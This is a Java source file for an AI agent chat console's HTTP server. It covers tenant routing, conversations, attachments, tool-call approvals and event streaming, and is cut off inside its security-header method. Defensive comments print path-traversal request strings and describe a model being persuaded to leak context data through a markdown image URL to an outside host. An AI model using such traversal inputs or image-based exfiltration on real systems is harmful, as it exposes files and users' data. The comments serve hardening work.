package dev.agentkit.chat.web;

import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.databind.SerializationFeature;
import com.fasterxml.jackson.datatype.jsr310.JavaTimeModule;
import com.sun.net.httpserver.HttpExchange;
import com.sun.net.httpserver.HttpServer;
import dev.agentkit.chat.Attachment;
import dev.agentkit.chat.ChatEvent;
import dev.agentkit.chat.ChatEvents;
import dev.agentkit.chat.ChatRuntime;
import dev.agentkit.chat.ChatUnavailable;
import dev.agentkit.chat.Conversation;
import dev.agentkit.chat.Step;
import dev.agentkit.chat.Turn;
import dev.agentkit.chat.store.ChatStore;
import dev.agentkit.core.reliability.ApprovalDecision;
import dev.agentkit.core.util.Cut;
import dev.agentkit.core.util.Quoted;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.net.URLDecoder;
import java.nio.charset.StandardCharsets;
import java.time.Duration;
import java.util.ArrayList;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;
import java.util.Objects;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

/**
 * The JSON API and the event stream a chat console consumes, on the JDK's own HTTP server.
 *
 * <p>No framework to install, which is the choice both existing example consoles made and the
 * reason a reader can follow one of them end to end. What is worth reading here is the shape:
 * a conversation, a turn, an attachment and a decision are resources a person can list,
 * inspect and act on, and the live view is the same append-only log that answers "what
 * happened" afterwards.
 *
 * <h2>A refusal is an answer, not a fault</h2>
 *
 * <p>{@link ChatUnavailable} — no model configured, no connector, a conversation already
 * working — comes back as a 409 carrying its own sentence, written for a person. A 500 means
 * this server has a bug, and it is logged as one. That distinction is the whole of the
 * degradation rule: the console boots without a model and says which variable is missing,
 * rather than refusing to start or reporting a fault.
 *
 * <h2>A tab left open across a restart reloads</h2>
 *
 * <p>The served page carries a build stamp and every response carries the same one. A console
 * whose server was upgraded underneath it is running yesterday's code against today's API,
 * and the failures that produces are baffling. An earlier prototype console learned this the hard
 * way and the trick is borrowed from it.
 */
public final class ChatServer implements AutoCloseable {

    private static final Logger LOG = LoggerFactory.getLogger(ChatServer.class);

    private static final ObjectMapper JSON = new ObjectMapper()
            .registerModule(new JavaTimeModule())
            .disable(SerializationFeature.WRITE_DATES_AS_TIMESTAMPS);

    /** How long an idle event stream waits before writing a comment to keep itself open. */
    private static final Duration KEEP_ALIVE = Duration.ofSeconds(20);

    /** The most an upload may carry, stated rather than discovered at the far end. */
    public static final int MAX_UPLOAD_BYTES = 32 * 1024 * 1024;

    private final HttpServer server;
    private final ChatRuntime runtime;
    private final ChatStore store;
    private final ChatEvents events;
    private final Tenants tenants;
    private final TenantOverview overview;
    private final AgentCatalog catalog;
    private final String buildStamp;
    private final ExecutorService workers;
    private final dev.agentkit.core.reliability.ModelPricing pricing;

    /**
     * What the console says about itself: the model, the connectors, and what is missing.
     *
     * <p>Supplied by the application because this module has no idea what a deployment is
     * connected to. Returning a map with a {@code problems} list is the shape the existing
     * consoles converged on, and the page renders it as a banner.
     */
    @FunctionalInterface
    public interface Overview {
        Map<String, Object> describe();
    }

    /** {@link Overview}, for a console that serves more than one tenant: what it says to this one. */
    @FunctionalInterface
    public interface TenantOverview {
        Map<String, Object> describe(String tenantId);
    }

    /**
     * Who a request is from: the tenant whose conversations it may read and act on, or empty for a request nobody
     * has vouched for, which is answered 401.
     *
     * <p>Supplied, because this module authenticates nobody. A console per person on its own port is
     * {@link #fixed}; a console many people share asks its sign-in.
     */
    @FunctionalInterface
    public interface Tenants {
        java.util.Optional<String> of(HttpExchange exchange);

        /** Where someone signs in, if somewhere: the page is sent there when the console answers 401. */
        default java.util.Optional<String> signIn() {
            return java.util.Optional.empty();
        }

        /** Every request is {@code tenantId}'s: one console, one person, as the examples run. */
        static Tenants fixed(String tenantId) {
            Objects.requireNonNull(tenantId, "tenantId");
            java.util.Optional<String> only = java.util.Optional.of(tenantId);
            return exchange -> only;
        }
    }

    /**
     * The agents a tenant may start a conversation with, when a deployment has more than one.
     *
     * <p>{@link #available} is what the page offers — each an {@code id}, a {@code name} and a {@code description} —
     * and {@link #pin} is what a new conversation is fixed to: the agent, at the version it has now. A deployment
     * with one agent has {@link #NONE}, and its conversations are pinned to nothing.
     */
    public interface AgentCatalog {
        List<Map<String, Object>> available(String tenantId);

        /**
         * The pin for a new conversation of {@code tenantId}'s with {@code agentId}, or with the one agent they may
         * use when {@code agentId} is null.
         *
         * @throws ChatUnavailable with a sentence for the person, for an agent they may not use or a choice not made
         */
        Conversation.Pin pin(String tenantId, String agentId);

        /**
         * A message filled in as a form rather than written: the request {@code input} makes for {@code conversation}'s
         * agent, which the runtime is then told as if the person had said it.
         *
         * @throws ChatUnavailable with a sentence for the person — the agent takes no form, or the input is not valid
         */
        default String message(String tenantId, Conversation conversation, Map<String, Object> input) {
            throw new ChatUnavailable("This conversation's agent takes no form; say what you need instead.");
        }

        /**
         * A form for {@code agentId} in a conversation pinned to no agent, where each message goes to its own: the
         * request it makes, as {@link #message(String, Conversation, Map)} does for a pinned conversation.
         */
        default String message(String tenantId, Conversation conversation, String agentId, Map<String, Object> input) {
            return message(tenantId, conversation, input);
        }

        /**
         * The agent, at its version now, one message goes to when the person chose it in a conversation pinned to no
         * agent. As {@link #pin}, it refuses an agent they may not use.
         */
        default Conversation.Pin forMessage(String tenantId, Conversation conversation, String agentId) {
            return pin(tenantId, agentId);
        }

        /** One agent, and conversations pinned to nothing. */
        AgentCatalog NONE = new AgentCatalog() {
            @Override
            public List<Map<String, Object>> available(String tenantId) {
                return List.of();
            }

            @Override
            public Conversation.Pin pin(String tenantId, String agentId) {
                return null;
            }
        };
    }

    public ChatServer(int port, ChatRuntime runtime, String tenantId, Overview overview)
            throws IOException {
        this(port, runtime, tenantId, overview, null);
    }

    /**
     * With the price of the model behind it, so a turn can say what it cost.
     *
     * <p>Supplied rather than looked up: a price is a fact about a deployment's contract, it
     * changes without the code changing, and a table of them baked into a framework is a table
     * that is quietly wrong. A console given none reports tokens and no money, which is honest
     * — a made-up number in a currency is worse than no number.
     */
    public ChatServer(int port, ChatRuntime runtime, String tenantId, Overview overview,
            dev.agentkit.core.reliability.ModelPricing pricing) throws IOException {
        this(port, runtime, Tenants.fixed(tenantId),
                overview == null ? tenant -> Map.of() : tenant -> overview.describe(), AgentCatalog.NONE, pricing);
    }

    /**
     * A console shared by many tenants, each seeing only their own conversations, each conversation with the agent
     * it was started with.
     */
    public ChatServer(int port, ChatRuntime runtime, Tenants tenants, TenantOverview overview,
            AgentCatalog catalog, dev.agentkit.core.reliability.ModelPricing pricing) throws IOException {
        this(new InetSocketAddress(port), runtime, tenants, overview, catalog, pricing);
    }

    /**
     * {@link #ChatServer(int, ChatRuntime, Tenants, TenantOverview, AgentCatalog,
     * dev.agentkit.core.reliability.ModelPricing)}, listening on {@code address}: on {@code 127.0.0.1}, reachable from
     * this machine only.
     */
    public ChatServer(InetSocketAddress address, ChatRuntime runtime, Tenants tenants, TenantOverview overview,
            AgentCatalog catalog, dev.agentkit.core.reliability.ModelPricing pricing) throws IOException {
        this.pricing = pricing;
        this.runtime = Objects.requireNonNull(runtime, "runtime");
        this.store = runtime.store();
        this.events = runtime.events();
        this.tenants = Objects.requireNonNull(tenants, "tenants");
        this.overview = overview == null ? tenant -> Map.of() : overview;
        this.catalog = Objects.requireNonNull(catalog, "catalog");
        // Distinct per process. A tab that reconnects and finds a different stamp reloads.
        //
        // Random, not System.nanoTime(). nanoTime's origin is arbitrary and chosen per JVM —
        // the only thing it promises is that differences WITHIN one process are meaningful.
        // Across two processes its values can overlap freely, so a restarted server could
        // hand a tab a stamp that tab had already seen, and the reload this exists to trigger
        // would not happen. That is the one case the feature is for.
        this.buildStamp = Long.toHexString(new java.security.SecureRandom().nextLong());
        this.server = HttpServer.create(address, 0);
        // Cached rather than fixed: every open event stream holds a thread for as long as the
        // browser tab is open, so a fixed pool of eight would stop answering anything at all
        // once eight tabs were watching. The work these threads do is blocking-and-waiting,
        // not computing.
        this.workers = Executors.newCachedThreadPool(runnable -> {
            Thread thread = new Thread(runnable, "chat-http");
            thread.setDaemon(true);
            return thread;
        });
        server.setExecutor(workers);
        server.createContext("/", this::serveUi);
        server.createContext("/api/", this::route);
    }

    /**
     * Serves {@code handler} at {@code path} beside the console, on the same port: an application's own endpoints,
     * such as its sign-in or an MCP endpoint. Before {@link #start}; {@code /} and {@code /api/} are the console's.
     */
    public void mount(String path, com.sun.net.httpserver.HttpHandler handler) {
        if (path.equals("/") || path.startsWith("/api/") || path.equals("/api")) {
            throw new IllegalArgumentException(path + " is the console's own");
        }
        server.createContext(path, handler);
    }

    public void start() {
        server.start();
    }

    public int port() {
        return server.getAddress().getPort();
    }

    public String buildStamp() {
        return buildStamp;
    }

    /**
     * Stops answering, and stops the threads that were answering.
     *
     * <p>{@code HttpServer.stop} does not touch an executor it was handed — that is the
     * caller's, and it has no way to know whether the caller is still using it. This one is
     * not: it was created here, for this server, and nothing else can reach it.
     *
     * <p>Leaving it running is not a tidiness problem. Every open event stream is a thread
     * parked in {@code streamEvents} holding a subscriber on the runtime's event bus, and
     * {@code stop} does not wake it — it closes the socket, and the loop only notices on its
     * next write, which for an idle stream is {@link #KEEP_ALIVE} away. So without this the
     * handler outlives the server, keeps reading a store the caller is about to close, and
     * whatever it does next happens after everything it depends on has been shut down.
     *
     * <p>{@code shutdownNow} rather than {@code shutdown}, because those threads are parked
     * on a poll and would otherwise be waited on rather than ended. The loop already handles
     * the interrupt — it just never used to receive one.
     */
    @Override
    public void close() {
        server.stop(0);
        workers.shutdownNow();
        try {
            if (!workers.awaitTermination(QUIET, TimeUnit.SECONDS)) {
                // Said rather than swallowed. A handler that will not end on an interrupt is
                // a bug in that handler, and a silent close would hide it behind whatever it
                // goes on to corrupt.
                LOG.warn("An event stream did not end within {}s of the console closing",
                        QUIET);
            }
        } catch (InterruptedException closingWasInterrupted) {
            Thread.currentThread().interrupt();
        }
    }

    /** How long {@link #close} waits for a handler to notice it was interrupted. */
    private static final long QUIET = 5;

    // --- routing --------------------------------------------------------------------

    private void route(HttpExchange exchange) throws IOException {
        String path = strip(exchange.getRequestURI().getPath().substring("/api".length()));
        String method = exchange.getRequestMethod();
        try {
            List<String> parts = new ArrayList<>(List.of(path.split("/")));
            parts.removeIf(String::isEmpty);

            java.util.Optional<String> who = tenants.of(exchange);
            if (who.isEmpty()) {
                Map<String, Object> refusal = new LinkedHashMap<>();
                refusal.put("error", "Sign in to use this console.");
                tenants.signIn().ifPresent(url -> refusal.put("signIn", url));
                send(exchange, 401, refusal);
                return;
            }
            String tenant = who.get();

            // The stream is not JSON and never returns, so it is decided before the switch.
            if (parts.size() == 3 && parts.get(0).equals("conversations")
                    && parts.get(2).equals("events") && method.equals("GET")) {
                streamEvents(exchange, tenant, decode(parts.get(1)));
                return;
            }

            Object body = switch (method + ' ' + path) {
                case "GET /overview" -> overviewJson(tenant);
                case "GET /agents" -> catalog.available(tenant);
                case "GET /conversations" -> store.conversations(tenant).stream()
                        .map(ChatServer::conversationJson).toList();
                case "POST /conversations" -> createConversation(tenant, readJson(exchange));
                default -> dynamic(tenant, method, parts, exchange);
            };
            if (body == null) {
                send(exchange, 404, Map.of("error", "No such endpoint: " + method + ' ' + path));
                return;
            }
            send(exchange, 200, body);
        } catch (ChatUnavailable stated) {
            send(exchange, 409, Map.of("error", String.valueOf(stated.getMessage())));
        } catch (IllegalArgumentException stated) {
            // A refusal from the store or the runtime — an unknown conversation, an id that
            // could name a file — is an answer, not a fault. It goes back as its own sentence.
            send(exchange, 409, Map.of("error", String.valueOf(stated.getMessage())));
        } catch (RuntimeException | IOException failure) {
            LOG.warn("{} {} failed", Quoted.of(method), Quoted.of(Cut.to(path, 512)),
                    Quoted.failure(failure));
            send(exchange, 500, Map.of("error", "The console failed to answer that."));
        }
    }

    private Object dynamic(String tenantId, String method, List<String> parts, HttpExchange exchange)
            throws IOException {
        if (parts.isEmpty()) {
            return null;
        }
        if (parts.get(0).equals("conversations")) {
            if (parts.size() == 2) {
                String id = decode(parts.get(1));
                return switch (method) {
                    case "GET" -> store.conversation(tenantId, id)
                            .map(found -> conversationDetailJson(tenantId, found)).orElse(null);
                    case "DELETE" -> Map.of("deleted", store.delete(tenantId, id));
                    case "PATCH" -> store.rename(tenantId, id,
                                    String.valueOf(readJson(exchange).getOrDefault("title", "")))
                            .map(ChatServer::conversationJson).orElse(null);
                    default -> null;
                };
            }
            if (parts.size() == 3 && method.equals("POST")) {
                String id = decode(parts.get(1));
                return switch (parts.get(2)) {
                    case "messages" -> messagesJson(tenantId, id, exchange);
                    case "cancel" -> Map.of("stopped", runtime.cancel(tenantId, id));
                    case "attachments" -> attachmentJson(attach(tenantId, id, exchange));
                    default -> null;
                };
            }
            if (parts.size() == 4 && parts.get(2).equals("turns") && method.equals("PATCH")) {
                // Leaving a finished answer out of what the agents read next, or putting it back.
                String id = decode(parts.get(1));
                String turnId = decode(parts.get(3));
                Object left = readJson(exchange).get("leftOut");
                if (!(left instanceof Boolean leftOut)) {
                    throw new IllegalArgumentException("Say leftOut: true or false.");
                }
                return store.turn(tenantId, id, turnId).filter(turn -> turn.state().isTerminal())
                        .flatMap(turn -> store.leaveOut(tenantId, id, turnId, leftOut))
                        .map(ChatServer::turnJson).orElse(null);
            }
            if (parts.size() == 3 && parts.get(2).equals("attachments")
                    && method.equals("GET")) {
                return store.attachments(tenantId, decode(parts.get(1))).stream()
                        .map(ChatServer::attachmentJson).toList();
            }
        }
        if (parts.get(0).equals("attachments") && parts.size() == 2 && method.equals("GET")) {
            serveAttachment(exchange, tenantId, decode(parts.get(1)));
            return "";
        }
        if (parts.get(0).equals("approvals")) {
            if (parts.size() == 1 && method.equals("GET")) {
                return runtime.pending(tenantId).stream()
                        .map(ChatServer::pendingJson).toList();
            }
            if (parts.size() == 3 && method.equals("POST")) {
                return decide(tenantId, decode(parts.get(1)), parts.get(2), exchange);
            }
        }
        return null;
    }

    // --- handlers -------------------------------------------------------------------

    private Map<String, Object> createConversation(String tenantId, Map<String, Object> request) {
        Object agent = request.get("agent");
        Conversation.Pin pin = catalog.pin(tenantId, agent == null ? null : String.valueOf(agent));
        return conversationJson(store.create(tenantId, String.valueOf(request.getOrDefault("title", "")), pin));
    }

    private Map<String, Object> overviewJson(String tenantId) {
        Map<String, Object> json = new LinkedHashMap<>(overview.describe(tenantId));
        json.put("build", buildStamp);
        json.put("tenant", tenantId);
        List<Map<String, Object>> agents = catalog.available(tenantId);
        if (!agents.isEmpty()) {
            json.put("agents", agents);
        }
        json.put("maxUploadBytes", MAX_UPLOAD_BYTES);
        return json;
    }

    private Map<String, Object> messagesJson(String tenantId, String conversationId, HttpExchange exchange)
            throws IOException {
        Map<String, Object> request = readJson(exchange);
        Object rawAttachments = request.get("attachments");
        List<String> attachmentIds = new ArrayList<>();
        if (rawAttachments instanceof List<?> list) {
            list.forEach(id -> attachmentIds.add(String.valueOf(id)));
        }
        String text = String.valueOf(request.getOrDefault("text", ""));
        // In a conversation pinned to no agent, the person may send one message to an agent of their choosing.
        String agentId = request.get("agent") instanceof String named && !named.isBlank() ? named.strip() : null;
        Conversation.Pin agent = null;
        if (agentId != null || request.get("input") instanceof Map<?, ?>) {
            Conversation conversation = store.conversation(tenantId, conversationId)
                    .orElseThrow(() -> new ChatUnavailable("There is no such conversation."));
            if (agentId != null) {
                if (conversation.agent() != null) {
                    throw new ChatUnavailable("This conversation is with " + conversation.agent().id()
                            + "; start a new one to talk to another agent.");
                }
                agent = catalog.forMessage(tenantId, conversation, agentId);
            }
            if (request.get("input") instanceof Map<?, ?> input) {
                @SuppressWarnings("unchecked")
                Map<String, Object> fields = (Map<String, Object>) input;
                text = agentId == null ? catalog.message(tenantId, conversation, fields)
                        : catalog.message(tenantId, conversation, agentId, fields);
            }
        }
        Turn turn = runtime.say(tenantId, conversationId, text, attachmentIds, agent);
        return turnJsonWithCost(turn);
    }

    private Attachment attach(String tenantId, String conversationId, HttpExchange exchange) throws IOException {
        // Percent-decoded: an HTTP header may only carry Latin-1 and a filename may carry
        // anything, so the console encodes it. A name that is not valid encoding is taken as
        // literal rather than refused — it is a label, and losing the upload over it would be
        // the wrong trade.
        String name = decodeName(header(exchange, "X-Filename", "attachment"));
        String mediaType = header(exchange, "Content-Type", "application/octet-stream");
        byte[] content = readBounded(exchange);
        return store.attach(tenantId, conversationId, name, mediaType, content);
    }

    private Map<String, Object> decide(String tenantId, String approvalId, String verdict, HttpExchange exchange)
            throws IOException {
        Map<String, Object> request = readJson(exchange);
        String by = String.valueOf(request.getOrDefault("by", "operator"));
        String note = String.valueOf(request.getOrDefault("note", ""));
        boolean standing = Boolean.TRUE.equals(request.get("standing"));
        ApprovalDecision decision = switch (verdict) {
            case "approve" -> ApprovalDecision.approve();
            case "reject" -> ApprovalDecision.deny(note.isBlank() ? "Rejected." : note);
            case "edit" -> {
                Object arguments = request.get("arguments");
                if (!(arguments instanceof Map<?, ?> edited)) {
                    throw new ChatUnavailable("Editing a call needs the 'arguments' to run "
                            + "instead.");
                }
                @SuppressWarnings("unchecked")
                Map<String, Object> typed = (Map<String, Object>) edited;
                yield ApprovalDecision.approveWithArguments(typed);
            }
            // A person answering a question the agent asked. It rides ApprovalDecision's one
            // string, which is what the runtime hands back to `ask`.
            case "answer" -> {
                String answer = String.valueOf(request.getOrDefault("answer", "")).strip();
                yield answer.isEmpty()
                        ? ApprovalDecision.deny("The person declined to answer.")
                        : ApprovalDecision.approveWithArguments(Map.of("answer", answer));
            }
            default -> throw new ChatUnavailable(
                    "A decision is 'approve', 'reject', 'edit' or 'answer'.");
        };
        return Map.of("decided",
                runtime.decide(tenantId, approvalId, decision, by, note, standing));
    }

    // --- server-sent events ----------------------------------------------------------

    /**
     * The live view of one conversation.
     *
     * <p>Resumes rather than restarts: {@code ?after=41} replays everything the buffer still
     * holds past 41 and then goes live, with no gap between the two. A client that was dropped
     * for falling behind is told so on the stream, which is the difference between "you missed
     * some, reconnect" and a silently truncated conversation.
     */
    private void streamEvents(HttpExchange exchange, String tenantId, String conversationId) throws IOException {
        if (store.conversation(tenantId, conversationId).isEmpty()) {
            send(exchange, 404, Map.of("error", "No such conversation."));
            return;
        }
        long after = longParam(exchange, "after", 0);
        exchange.getResponseHeaders().add("Content-Type", "text/event-stream; charset=utf-8");
        harden(exchange);
        exchange.getResponseHeaders().add("Cache-Control", "no-store");
        // A reverse proxy that buffers turns a live stream back into a slow poll.
        exchange.getResponseHeaders().add("X-Accel-Buffering", "no");
        exchange.sendResponseHeaders(200, 0);
        try (ChatEvents.Subscriber subscriber = events.subscribe(conversationId, after);
                OutputStream out = exchange.getResponseBody()) {
            write(out, ": stream " + buildStamp + "\n\n");
            while (subscriber.active()) {
                ChatEvent event = subscriber.poll(KEEP_ALIVE);
                if (event == null) {
                    // A comment, not an event: it keeps proxies from closing an idle stream
                    // and is ignored by every SSE client.
                    write(out, ": keep-alive\n\n");
                    continue;
                }
                write(out, "id: " + event.sequence() + "\ndata: "
                        + JSON.writeValueAsString(eventJson(event)) + "\n\n");
            }
            if (subscriber.dropped()) {
                write(out, "event: dropped\ndata: "
                        + JSON.writeValueAsString(Map.of("after", subscriber.lastSequence()))
                        + "\n\n");
            }
        } catch (InterruptedException stopped) {
            Thread.currentThread().interrupt();
        } catch (IOException gone) {
            // The browser closed the tab. Not worth a stack trace.
            LOG.debug("An event stream of {} closed", Quoted.of(conversationId));
        }
    }

    private static void write(OutputStream out, String text) throws IOException {
        out.write(text.getBytes(StandardCharsets.UTF_8));
        out.flush();
    }

    // --- rendering -------------------------------------------------------------------

    // Everything below that originated with a person — a title, a message, a filename, a
    // model's answer — stays raw in the JSON on purpose: the transport is not the sink. The
    // page escapes what it draws, and the tools fence what the model reads.

    private static Map<String, Object> conversationJson(Conversation conversation) {
        Map<String, Object> json = new LinkedHashMap<>();
        json.put("id", conversation.id());
        json.put("title", conversation.title());
        json.put("createdAt", conversation.createdAt().toString());
        json.put("updatedAt", conversation.updatedAt().toString());
        if (conversation.agent() != null) {
            json.put("agent", Map.of("id", conversation.agent().id(), "version", conversation.agent().version()));
        }
        return json;
    }

    private Map<String, Object> conversationDetailJson(String tenantId, Conversation conversation) {
        Map<String, Object> json = new LinkedHashMap<>(conversationJson(conversation));
        java.util.List<Turn> turns = store.turns(tenantId, conversation.id());
        json.put("turns", turns.stream().map(this::turnJsonWithCost).toList());
        // The conversation's own totals, so a person does not add up bubbles. Summed from the
        // turns rather than metered separately: two counters over one fact drift, and the one
        // that is wrong is always the one nobody is looking at.
        long input = turns.stream().mapToLong(turn -> turn.usage().inputTokens()).sum();
        long output = turns.stream().mapToLong(turn -> turn.usage().outputTokens()).sum();
        json.put("inputTokens", input);
        json.put("outputTokens", output);
        costOf(new dev.agentkit.core.llm.TokenUsage((int) input, (int) output))
                .ifPresent(cost -> json.put("costUsd", cost));
        json.put("attachments", store.attachments(tenantId, conversation.id()).stream()
                .map(ChatServer::attachmentJson).toList());
        json.put("working", runtime.isWorking(conversation.id()));
        json.put("lastSequence", events.since(conversation.id(), 0).stream()
                .mapToLong(ChatEvent::sequence).max().orElse(0));
        return json;
    }

    /** A turn, with what it cost where a price is known. */
    private Map<String, Object> turnJsonWithCost(Turn turn) {
        Map<String, Object> json = new LinkedHashMap<>(turnJson(turn));
        costOf(turn.usage()).ifPresent(cost -> json.put("costUsd", cost));
        return json;
    }

    /** What a usage cost, if this deployment said what its model charges. */
    private java.util.Optional<Double> costOf(dev.agentkit.core.llm.TokenUsage usage) {
        return pricing == null ? java.util.Optional.empty()
                : java.util.Optional.of(pricing.costOf(usage));
    }

    private static Map<String, Object> turnJson(Turn turn) {
        Map<String, Object> json = new LinkedHashMap<>();
        json.put("id", turn.id());
        json.put("ordinal", turn.ordinal());
        json.put("userText", turn.userText());
        json.put("attachments", turn.attachmentIds());
        json.put("answer", turn.answer());
        json.put("state", turn.state().name());
        json.put("detail", turn.detail());
        json.put("views", turn.views().stream()
                .map(view -> Map.of("kind", view.kind(), "data", view.data()))
                .toList());
        json.put("steps", turn.steps().stream().map(ChatServer::stepJson).toList());
        json.put("inputTokens", turn.usage().inputTokens());
        json.put("outputTokens", turn.usage().outputTokens());
        json.put("startedAt", turn.startedAt().toString());
        json.put("endedAt", turn.endedAt() == null ? null : turn.endedAt().toString());
        if (turn.agent() != null) {
            json.put("agent", Map.of("id", turn.agent().id(), "version", turn.agent().version()));
        }
        json.put("leftOut", turn.leftOut());
        return json;
    }

    private static Map<String, Object> stepJson(Step step) {
        Map<String, Object> json = new LinkedHashMap<>();
        json.put("sequence", step.sequence());
        json.put("kind", step.kind().name());
        json.put("name", step.name());
        json.put("detail", step.detail());
        json.put("millis", step.millis());
        json.put("failed", step.failed());
        json.put("at", step.at().toString());
        return json;
    }

    private static Map<String, Object> attachmentJson(Attachment attachment) {
        Map<String, Object> json = new LinkedHashMap<>();
        json.put("id", attachment.id());
        json.put("name", attachment.name());
        json.put("mediaType", attachment.mediaType());
        json.put("bytes", attachment.bytes());
        json.put("uploadedAt", attachment.uploadedAt().toString());
        return json;
    }

    private static Map<String, Object> pendingJson(ChatRuntime.PendingDecision decision) {
        Map<String, Object> json = new LinkedHashMap<>();
        json.put("id", decision.id());
        json.put("conversationId", decision.conversationId());
        json.put("turnId", decision.turnId());
        json.put("kind", decision.kind().name());
        json.put("tool", decision.tool());
        json.put("arguments", decision.arguments());
        json.put("capability", decision.capability());
        json.put("reason", decision.reason());
        json.put("effect", decision.effect());
        json.put("reversible", decision.reversible());
        json.put("question", decision.question());
        json.put("askedAt", decision.askedAt().toString());
        return json;
    }

    private static Map<String, Object> eventJson(ChatEvent event) {
        Map<String, Object> json = new LinkedHashMap<>();
        json.put("sequence", event.sequence());
        json.put("conversationId", event.conversationId());
        json.put("turnId", event.turnId());
        json.put("type", event.type().name());
        json.put("runId", event.runId());
        json.put("runName", event.runName());
        json.put("data", event.data());
        json.put("at", event.at().toString());
        return json;
    }

    // --- the page --------------------------------------------------------------------

    /**
     * The built console, from the classpath.
     *
     * <p>Any path that is not the API and has no extension serves the page, so a deep link to
     * a conversation survives a reload — a single-page app owns its own routes and the server
     * must not 404 them. Anything with an extension is an asset, served with its type or not
     * at all.
     */
    /**
     * Where the console's own page lives on the classpath.
     *
     * <p>Under this module's package, not at the root as {@code /ui}, and that is not tidiness.
     * A classpath is flat: {@code agentkit-examples-workbench} ships its dashboard as
     * {@code ui/index.html}, {@code agentkit-examples-workbench-chat} depends on both modules, and
     * {@code getResourceAsStream("/ui/index.html")} there returned whichever jar the loader
     * reached first. It returned the dashboard — so the chat console served the dashboard's
     * page, on the chat's port.
     *
     * <p>Every test in this repository passed, because each module's tests run on a classpath
     * where only one {@code ui/} exists, and the collision only exists in the third module that
     * depends on both. It was found by opening the console in a browser, which is the whole
     * argument for #357's smoke run.
     */
    private static final String UI = "/dev/agentkit/chat/ui";

    private void serveUi(HttpExchange exchange) throws IOException {
        String path = exchange.getRequestURI().getPath();
        String resource = path.equals("/") || !path.contains(".") ? UI + "/index.html"
                : UI + path;
        // The one thing that must not be reachable through a URL: a path that climbs out of
        // the resource root. Refused rather than normalised, because there is no legitimate
        // request that contains one.
        //
        // It IS reachable — measured. The JDK's server hands the handler the path with the
        // dot-segments intact, and `%2e%2e` and `..%2f` both arrive decoded:
        //
        //   raw=/ui/..%2f..%2fpom.xml  ->  getPath()=/ui/../../pom.xml
        //   raw=/.%2e/pom.xml          ->  getPath()=/../pom.xml
        //
        // What stops it a second time is that the JDK's own classloader declines to resolve a
        // resource name containing "..", so today nothing is served either way. That is an
        // implementation detail of one classloader and not a contract, and the console runs
        // from a DIRECTORY classloader in the demo — target/classes — which is exactly where a
        // filesystem-backed lookup would be tempting. So the check stays, and its refusal is
        // deliberately worded differently from a plain miss so a test can tell which of the
        // two answered.
        if (resource.contains("..")) {
            send(exchange, 404, Map.of("error", "Not found."));
            return;
        }
        byte[] page;
        try (InputStream in = ChatServer.class.getResourceAsStream(resource)) {
            if (in == null) {
                send(exchange, 404, Map.of("error", "Not found: " + Cut.to(path, 200)));
                return;
            }
            page = in.readAllBytes();
        }
        if (resource.endsWith("index.html")) {
            page = new String(page, StandardCharsets.UTF_8)
                    .replace("%UI_BUILD%", buildStamp)
                    .getBytes(StandardCharsets.UTF_8);
        }
        exchange.getResponseHeaders().add("Content-Type", contentTypeOf(resource));
        harden(exchange);
        // The page must not be cached — it carries the build stamp. Hashed assets may be.
        exchange.getResponseHeaders().add("Cache-Control",
                resource.endsWith("index.html") ? "no-store" : "public, max-age=31536000");
        exchange.sendResponseHeaders(200, page.length);
        try (OutputStream out = exchange.getResponseBody()) {
            out.write(page);
        }
    }

    private void serveAttachment(HttpExchange exchange, String tenantId, String id) throws IOException {
        var attachment = store.attachment(tenantId, id);
        var content = store.content(tenantId, id);
        if (attachment.isEmpty() || content.isEmpty()) {
            send(exchange, 404, Map.of("error", "No such attachment."));
            return;
        }
        // Never inline. The bytes are somebody else's, and an uploaded .html rendered in this
        // origin would run as this console — the same-origin hole every file host has to close.
        exchange.getResponseHeaders().add("Content-Type", "application/octet-stream");
        exchange.getResponseHeaders().add("Content-Disposition", "attachment");
        // Sandboxed as well as downloaded. Disposition and nosniff are what stop it rendering;
        // this is what makes it inert if some future browser or proxy renders it anyway — an
        // uploaded file is the one payload on this server whose bytes nobody has looked at.
        exchange.getResponseHeaders().add("Content-Security-Policy", "sandbox; default-src 'none'");
        exchange.getResponseHeaders().add("X-Content-Type-Options", "nosniff");
        exchange.getResponseHeaders().add("Referrer-Policy", "no-referrer");
        exchange.sendResponseHeaders(200, content.get().length);
        try (OutputStream out = exchange.getResponseBody()) {
            out.write(content.get());
        }
    }

    /**
     * What the browser is allowed to do with this page.
     *
     * <p>The console renders text that a requester, an uploader and a model all had a hand in.
     * React escapes it and {@code Markdown}'s schema sanitizes what is deliberately markup —
     * those are the controls that are supposed to work. This is the one that catches the case
     * where they did not.
     *
     * <h4>What each directive is actually stopping</h4>
     *
     * <ul>
     *   <li>{@code script-src 'self'} — no inline script and no CDN, so a bug that got markup
     *       past the sanitizer still cannot get <em>code</em> past this. The built page loads
     *       one module from this origin and has no inline script at all, which
     *       {@code TheConsoleIsBuiltIntoTheJarTest} pins.</li>
     *   <li>{@code img-src 'self' data:} — the quiet one, and the reason this is worth writing.
     *       The markdown schema permits {@code http}/{@code https} image sources, so a model
     *       can emit {@code ![](https://elsewhere/?q=…)} and the browser will fetch it. That
     *       request is an exfiltration channel out of the model's context, and it needs no
     *       script and no injection — only a model that was persuaded. This closes it.</li>
     *   <li>{@code connect-src 'self'} — the same for {@code fetch} and the event stream.</li>
     *   <li>{@code frame-ancestors 'none'} — nobody frames the console, so nobody clickjacks
     *       the approval button, which is the one button on this page worth stealing a click
     *       for.</li>
     *   <li>{@code base-uri 'none'}, {@code object-src 'none'}, {@code form-action 'none'} —
     *       the three that turn a lesser injection into a working one.</li>
     * </ul>
     *
     * <h4>{@code 'unsafe-inline'} for styles, and why that is not a shrug</h4>
     *
     * <p>React sets a {@code style} attribute for the things that genuinely cannot be a class:
     * a chart series' colour, a numeric column's alignment. CSP treats a style attribute as
     * inline style, so the alternatives are this or no dynamic colour. It is a real weakening —
     * CSS can exfiltrate through a background image URL — and it is bounded by the directive
     * above it: {@code img-src 'self' data:} is what makes a CSS-borne fetch to another origin
     * fail too. Script, where the teeth are, keeps no such allowance.
     */
    private static void harden(HttpExchange exchange) {
        exchange.getResponseHeaders().add("Content-Security-Policy", String.join("; ",
                "default-src 'self'",
                "script-src 'self'",
                "style-src 'self' 'unsafe-inline'",
                "img-src 'self' data:",
